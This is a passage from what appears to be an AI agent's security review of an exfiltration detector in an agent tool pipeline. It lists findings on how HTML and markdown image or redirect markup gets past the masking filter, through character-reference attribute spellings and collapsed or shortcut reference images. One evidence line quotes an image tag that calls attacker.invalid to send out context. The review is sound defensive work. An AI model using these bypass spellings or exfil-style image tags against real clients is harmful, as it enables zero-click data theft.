- `graph_used: no (not-relevant)` — the dispatch named the file set exactly, and the graph answers
  from the last `keryx gdgraph build` while this checkout carries a large uncommitted multi-worker
  change set, so a graph answer could not be quoted as current.
- `wiki_used: no (not-relevant)` — the governing texts are the flow artifacts, `policies.md` and the
  frozen `acceptance-criteria.md`; all were read directly as the dispatch required.
- `ctx_used: partial, disclosed` — `bun src/cli.ts ctx rg`, `ctx diff` and one `ctx run` of the
  required four-suite command were used; probe **execution** ran `bun` directly, because `ctx run`'s
  compaction elides the per-row matrices that are this review's evidence (the same disclosure T46,
  T53 and T63 each made). Bounded `Read` with `offset`/`limit` and small `bun -e` readers were used
  for file excerpts.
- `raw_rg_used: no` for project code. One `ls | grep -c` over the log **directory listing** (not
  project code) was used to count existing `T46-*` logs; every subsequent filter went through
  `bun -e`. `cat`, `tail`, `sed` and raw `git diff`/`git show` were refused by the routing hook and
  replaced with routed or `bun`-based equivalents.

```json keryx:findings
[
  {
    "id": "F-001",
    "global_id": "T66#F-001",
    "reviewer": "T66-independent-review-security-code+review-logic",
    "severity": "blocker",
    "file": "src/security/detect/exfil.ts",
    "line": 520,
    "symbol": "hasAttributeValue",
    "problem": "Both gates T46 introduced (`<input>` requires type=image at :845, `<meta>` requires http-equiv=refresh at :848) compare the RAW attribute value. The HTML tokenizer consumes character references in attribute-value states, so http-equiv=\"&#114;efresh\" IS refresh and type=\"&#105;mage\" IS an image submit button. The module asserts that premise twice itself (renderableUrl, and metaRefreshDestination which decodes `content` for exactly this reason) and withholds it from the two gates.",
    "impact": "7 measured spellings of two surfaces the requirements package declares covered reach a model client unmasked, including the NAV surface that navigates the whole client to the attacker. All 7 return isError:false with redaction.state:\"none\" and pass prepareOutputForPersistence, validateOutputForTransport and the seam byte-identical with attacker.invalid present. Spelling bypass of a covered surface (AC5) and a failure of 'every covered surface is closed at the tool dispatch and the persistence materializer'.",
    "suggested_fix": "Compare the gate against decodeCharacterReferences(attribute.value) — the function already in this file — keeping trim().toLowerCase(); add the four type= and three http-equiv= spellings to the T46 gate tests beside the content=\"0&#59;…\" case that already exists.",
    "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-gates.ts -> gateBypasses: [inputTypeDecimalRef, inputTypeHexRef, inputTypeTrailingRef, inputTypeNoSemicolon, metaEquivDecimalRef, metaEquivHexRef, metaEquivTrailingRef]; raw .metaproject/data/gdctx/raw/T66-gates.log (sha256 278f74442b439049d53e5af4d41c6890eff2771e09314b8a4e677f72d186e993). Boundaries: T66-boundary.ts -> leakingWithStateNone includes bypMetaRefreshCharref, bypMetaRefreshHexCharref, bypInputTypeCharref, bypInputTypeTrailingCharref; raw T66-boundary.log (sha256 62a90cfed7f0cda434bc6b985073f4f7209d1ff6f3bb4d8fc235dd492247e76b).",
    "confidence": "high",
    "dedupe_key": "exfil-gate-raw-value-not-decoded",
    "blocking_merge": true,
    "related_skill": "review-security-code",
    "learning_candidate": true,
    "class_scope": {
      "sites": [
        "src/security/detect/exfil.ts:845 (input/type gate)",
        "src/security/detect/exfil.ts:848 (meta/http-equiv gate)"
      ],
      "enumeration_method": "hasAttributeValue has exactly two call sites in the module, found by reading the whole file; every other branch keys off the attribute NAME position, which a tokenizer does not entity-decode, so the class is closed at two members."
    }
  },
  {
    "id": "F-002",
    "global_id": "T66#F-002",
    "reviewer": "T66-independent-review-security-code+review-logic",
    "severity": "blocker",
    "file": "src/security/detect/exfil.ts",
    "line": 433,
    "symbol": "REFERENCE_USE",
    "problem": "REFERENCE_USE matches only the FULL CommonMark reference form ![alt][ref]; the collapsed form ![alt][] (empty second group) and the shortcut form ![alt] (no second bracket pair) match nothing, and INLINE's \\[[^\\]]*\\] cannot span the balanced brackets CommonMark permits in a description, so ![a[b]c](URL) matches nothing either. All three render an auto-fetching <img>. T46 declared the enumeration re-derived from the standard and listed the markdown reference definition as covered (spec 2.1), then wrote that completeness into the requirements package as 'перечень полный, не пример'.",
    "impact": "The most ordinary markdown reference-image spelling — ![logo] with [logo]: URL at the bottom of a README — is a zero-click exfil channel the mandatory floor releases, reaching mcp/persist/transport/seam with redaction.state:\"none\". The detector gap predates T46; the false completeness claim in a normative document does not.",
    "suggested_fix": "Make the second bracket group optional and empty-tolerant — /(!?)\\[([^\\]]*)\\](?:\\[([^\\]]*)\\])?/g — resolving the label to group 3 when non-empty and to group 2 otherwise (CommonMark's collapsed/shortcut rule), keeping the existing '!'-only gate so plain reference links stay click-gated; fix INLINE's description grammar separately; then correct T46-spec 2.1 and the policies.md covered list.",
    "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-md-oracle.ts — `marked` (independent CommonMark renderer, offline) emits <img src=\"https://attacker.invalid/p?ctx=CTX\"> for collapsedReference, shortcutReference, shortcutReferenceInProse, collapsedUppercaseRef and inlineNestedBrackets while detectExfil returns 0 findings for each; raw .metaproject/data/gdctx/raw/T66-md-oracle.log (sha256 896683fcf3ef2638322c7d6bf46d2878c0589f14ef104906483f8d7e8850dad9). Boundaries: T66-boundary.log rows bypCollapsedRefImage, bypShortcutRefImage, bypNestedBracketAlt leak at all four.",
    "confidence": "high",
    "dedupe_key": "exfil-markdown-collapsed-shortcut-reference-image-released",
    "blocking_merge": true,
    "related_skill": "review-security-code",
    "learning_candidate": true,
    "class_scope": {
      "sites": [
        "src/security/detect/exfil.ts:431 (INLINE description grammar)",
        "src/security/detect/exfil.ts:433 (REFERENCE_USE label grammar)",
        ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T46-spec.md:73 (row C2, 'already covered')",
        "docs/requirements/keryx-agent-first-core/policies.md:28 (the covered list)"
      ],
      "enumeration_method": "Every CommonMark image spelling (inline, full reference, collapsed reference, shortcut reference, balanced-bracket description, uppercase label) driven through `marked` as renderer oracle and through detectExfil in T66-md-oracle.ts; the released ones are the class."
    }
  },
  {
    "id": "F-003",
    "global_id": "T66#F-003",
    "reviewer": "T66-independent-review-security-code+review-logic",
    "severity": "major",
    "file": "docs/requirements/keryx-agent-first-core/policies.md",
    "line": 28,
    "symbol": "### Auto-fetch floor: покрытая и непокрытая область",
    "problem": "The new subsection is inaccurate in both directions. (a) It marks the covered list 'перечень полный, не пример' while <input type=image src>, <meta http-equiv=refresh> and the markdown reference definition are covered only for some spellings (T66#F-001, T66#F-002). (b) Line 34 says coverage ignores nesting and context with <base href> as the ONLY exception; in fact markup inside another element's quoted attribute value is deliberately not flagged (T53#F-004) and an unterminated quoted value suppresses the rest of the fragment (T53#F-003) — two further context exceptions that make coverage narrower than promised. (c) It never states that element and attribute matching is ASCII case-insensitive, so a reader cannot learn that quoted component markup (<Video src>, <Iframe src> in a .tsx) is masked — coverage wider than the document implies.",
    "impact": "The acceptance criterion 'the recorded limitation matches the implementation exactly, in both directions' is not met. A requirements package that overstates completeness is worse than the silence it replaced, because the next round will trust it instead of re-deriving.",
    "suggested_fix": "After F-001/F-002 are fixed, keep 'перечень полный'; until then qualify the two gated entries. Add the two context exceptions beside the <base> one, and one clause stating that element and attribute names are matched ASCII case-insensitively so quoted component markup with the same names is covered.",
    "evidence": "Covered/deferred/never lists diffed by hand against FETCHING_ATTRIBUTES (exfil.ts:484-513) and HTML_START_TAG (exfil.ts:452) — they match. (a) T66-gates.log; (b) exfil.ts:868-882 and T66-gates.ts Part B, raw T66-gates.log; (c) T66-fp.log row `reactMediaComponent side=covered-side findings=4`, raw .metaproject/data/gdctx/raw/T66-fp.log (sha256 07aca255cd77e2bea915255edf55b55883ccd08def158f533558a1a6f9e6a6af).",
    "confidence": "high",
    "dedupe_key": "policies-md-auto-fetch-subsection-inaccurate",
    "blocking_merge": false,
    "related_skill": "review-logic",
    "learning_candidate": true,
    "class_scope": {
      "sites": [
        "docs/requirements/keryx-agent-first-core/policies.md:28",
        "docs/requirements/keryx-agent-first-core/policies.md:34",
        "src/security/detect/exfil.ts:41-63 (the module's 'WHAT THIS FLOOR DOES NOT COVER' block, same two omissions)"
      ],
      "enumeration_method": "T46 section 7 records the limitation in exactly two places (the module header and policies.md); both were read line by line against FETCHING_ATTRIBUTES, HTML_START_TAG, the HTML_START_TAG.lastIndex decision and readStartTag's unterminated-quote branch."
    }
  },
  {
    "id": "F-004",
    "global_id": "T66#F-004",
    "reviewer": "T66-independent-review-security-code+review-logic",
    "severity": "minor",
    "file": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T46-implementation.md",
    "line": null,
    "symbol": "section 4 row U16 / section 6.2",
    "problem": "U16 is justified with 'obsolete but honoured; benign incidence expected ~0 in modern source' and 'zero benign instances measured'. The background attribute is current practice in the one document class that still needs it — HTML email templates for Outlook — and such a template is a FILE-shaped carrier with no particular content, the property T46 used to defer script and link.",
    "impact": "Bounded: the same template already carries <img src>, which the accepted baseline masks, so the kind of harm is unchanged and covering U16 still stands. What is wrong is the recorded reason, which the next round will read as evidence.",
    "suggested_fix": "Replace the justification with the accurate one: the carrier exists (HTML email templates), it already trips the accepted <img src> baseline, and the allowlist is the remedy.",
    "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-fp.ts -> `htmlEmailTemplate side=covered-side findings=5 {\"egress.html-image-exfil\":5}`; raw .metaproject/data/gdctx/raw/T66-fp.log (sha256 07aca255cd77e2bea915255edf55b55883ccd08def158f533558a1a6f9e6a6af).",
    "confidence": "high",
    "dedupe_key": "u16-background-benign-incidence-claim-false",
    "blocking_merge": false,
    "related_skill": "review-logic",
    "learning_candidate": false
  },
  {
    "id": "F-005",
    "global_id": "T66#F-005",
    "reviewer": "T66-independent-review-security-code+review-logic",
    "severity": "minor",
    "file": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T46-implementation.md",
    "line": null,
    "symbol": "section 4 row U02 / section 3",
    "problem": "'Masking it removes a navigation nobody wanted, so the mask has no cost of its own' is true of a rendered document and false of a quoted one. A generated documentation redirect stub is a file whose entire content is one <meta http-equiv=refresh>; because the whole directive is the mask span, a reader of that file loses both the destination and the timeout — a file-shaped, content-independent cost of the same shape T46 used to defer <script src>.",
    "impact": "Small and does not change the decision (the NAV blast radius dominates), but the cost weighing records a zero where there is not one.",
    "suggested_fix": "Record the redirect-stub carrier in section 6 beside the <iframe> disclosure.",
    "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-fp.ts -> `docsRedirectStub side=covered-side findings=1 {\"egress.html-meta-refresh-exfil\":1}`; raw .metaproject/data/gdctx/raw/T66-fp.log.",
    "confidence": "high",
    "dedupe_key": "u02-meta-refresh-quoted-source-cost",
    "blocking_merge": false,
    "related_skill": "review-logic",
    "learning_candidate": false
  },
  {
    "id": "F-006",
    "global_id": "T66#F-006",
    "reviewer": "T66-independent-review-security-code+review-logic",
    "severity": "minor",
    "file": "src/security/detect/exfil.ts",
    "line": 452,
    "symbol": "HTML_START_TAG (frame deliberately absent)",
    "problem": "U17 moved from 'cover now' to 'never cover' on the claim that a <frame> start tag is ignored in the 'in body' insertion mode. That is a tree-builder claim no oracle in this flow can test — lol-html attributes src to <frame> exactly as it does to <iframe> — and the spec's in-body rules do not name frame, so it falls to 'any other start tag'. The stated reason for choosing never over cover is that 'a principled exclusion is better than a gratuitous inclusion that costs nothing'.",
    "impact": "An asymmetric bet: if the claim holds, covering costs one table entry and zero measured false positives; if it fails in any renderer, the surface stays open and a regression test now pins it open.",
    "suggested_fix": "Either add `frame: { src: EMBEDDED_URL }` to FETCHING_ATTRIBUTES and the element to HTML_START_TAG, or downgrade the recorded reason to 'not measured; excluded on the spec reading of the in-body insertion mode' so the next round knows it is a reading.",
    "evidence": ".metaproject/data/gdctx/raw/T66-enum.log row `U17.frameSrc cls=SUB t46=never oracle=true verdict=released` (sha256 4706e3613dfd7d3a267fc185ad479d93197ed9249566a183f683864639815209).",
    "confidence": "medium",
    "dedupe_key": "u17-frame-never-cover-unverified",
    "blocking_merge": false,
    "related_skill": "review-security-code",
    "learning_candidate": false
  },
  {
    "id": "F-007",
    "global_id": "T66#F-007",
    "reviewer": "T66-independent-review-security-code+review-logic",
    "severity": "info",
    "file": "src/security/detect/exfil.ts",
    "line": 611,
    "symbol": "readStartTag (close === -1 branch) with the widened HTML_START_TAG",
    "problem": "An unterminated quoted value consumes to end of input and the scan resumes past it, so everything after is unexamined. Before T46 only <img>, <image> and <base> could trigger that; the 20-element set now includes <td>, <tr>, <table>, <body>, <meta> and <source>, which appear in essentially every quoted HTML file.",
    "impact": "Not a bypass under the stated threat model — lol-html emits no element after the unterminated value on every row I tested, matching the detector. Recorded because the blast radius of an inherited decision grew by an order of magnitude with no note in T46, and because it stops being safe for a renderer that sanitizes by re-serializing (already declared out of model). My probe's markedRendersImg column is raw passthrough, not a fetch oracle.",
    "suggested_fix": "Record the widened blast radius beside the T53#F-003 note in the module header.",
    "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-gates.ts Part B; raw .metaproject/data/gdctx/raw/T66-gates.log.",
    "confidence": "high",
    "dedupe_key": "widened-anchor-set-unterminated-quote-suppression",
    "blocking_merge": false,
    "related_skill": "review-security-code",
    "learning_candidate": false
  },
  {
    "id": "F-008",
    "global_id": "T66#F-008",
    "reviewer": "T66-independent-review-security-code+review-logic",
    "severity": "info",
    "file": "src/security/detect/exfil.ts",
    "line": 520,
    "symbol": "hasAttributeValue (duplicate resolution)",
    "problem": "Duplicate attributes are resolved eagerly, so `<input type=text type=image src=…>` is flagged; a conformant tree builder keeps the FIRST duplicate, making it a text input that fetches nothing.",
    "impact": "A masked URL in a shape no renderer requests. Contrived and disclosed in the code comment; recorded only because that comment says the eager direction 'costs nothing' and here it costs one false positive.",
    "suggested_fix": "Either resolve the gate on the first occurrence, matching the tree builder, or amend the comment to say the eager direction costs a false positive in the duplicate case.",
    "evidence": ".metaproject/data/gdctx/raw/T66-gates.log -> `FALSE-POSITIVE inputDupTypeTextFirst`.",
    "confidence": "high",
    "dedupe_key": "input-duplicate-type-eager-false-positive",
    "blocking_merge": false,
    "related_skill": "review-logic",
    "learning_candidate": false
  },
  {
    "id": "F-009",
    "global_id": "T66#F-009",
    "reviewer": "T66-independent-review-security-code+review-logic",
    "severity": "info",
    "file": "src/security/detect/exfil.test.ts",
    "line": 983,
    "symbol": "T46_CLASS_VECTORS",
    "problem": "The persistence and transport regressions iterate 11 vectors; <audio src>, <source src>, <video src>, <feImage href>, <image xlink:href>, <td background> and track's non-default spelling are pinned only at the detector level.",
    "impact": "None observed — I drove 15 covered rows through all four boundaries and all are closed. A pinning gap, not a defect.",
    "suggested_fix": "Extend T46_CLASS_VECTORS to one vector per policy id per element family.",
    "evidence": ".metaproject/data/gdctx/raw/T66-boundary.log -> hostileFullyClosed: 17.",
    "confidence": "high",
    "dedupe_key": "t46-boundary-vectors-subset",
    "blocking_merge": false,
    "related_skill": "review-logic",
    "learning_candidate": false
  },
  {
    "id": "F-010",
    "global_id": "T66#F-010",
    "reviewer": "T66-independent-review-security-code+review-logic",
    "severity": "major",
    "file": "src/security/detect/exfil.ts",
    "line": null,
    "symbol": "whole file (concurrent write during review)",
    "problem": "exfil.ts and exfil.test.ts were rewritten by a concurrent WRITER during this review (exfil.ts efe360a3… -> 63edcc57…, exfil.test.ts 6ec7871c… -> a8f2365b…). The edit removes the <base> inert-span machinery (nonRenderedSpans, fencedCodeBlockSpans, HTML_COMMENT_SPAN, isInNonRenderedSpan: 0 occurrences now) under the label 'T62#F-001 … (suppression reverted)' — the behaviour the module header, T53#F-001 and T63 justify at length and T46 preserved. At 17:45Z my ctx run of the four required suites returned 93 pass / 4 fail; two minutes later the same command returned 97/0.",
    "impact": "T46's sections 8.1/8.4/8.5 describe a tree that no longer exists and the module header now documents a <base> behaviour the code no longer has. T46's own surface work is unaffected — every T66 probe re-run after the drift is byte-identical — but the orchestrator cannot treat T46's verification as current, and two workers are writing the same file.",
    "suggested_fix": "Serialize the writers, settle the T63-vs-T62 <base> inert-span question once, then re-run T46's nine matrices and the four focused suites against the settled tree.",
    "evidence": "SHA-256 of the eight dispatch-named files at review start (21:39) and end (21:52), recorded in T66-review.md Scope; .metaproject/data/gdctx/raw/2026-09-06T17-45-01-455Z_run.log (93 pass / 4 fail, exit 1) versus …/2026-09-06T17-32-14-893Z_run.log (96 pass / 0 fail); nonRenderedSpans occurrences in the current exfil.ts: 0.",
    "confidence": "high",
    "dedupe_key": "concurrent-write-drift-exfil-t62-revert",
    "blocking_merge": false,
    "related_skill": "flow-orchestrator",
    "learning_candidate": true,
    "class_scope": {
      "sites": [
        "src/security/detect/exfil.ts",
        "src/security/detect/exfil.test.ts"
      ],
      "enumeration_method": "SHA-256 of every file the dispatch named, taken at review start and at review end; exactly these two differ, and the module was re-read to identify which symbols the concurrent edit removed."
    }
  }
]
```
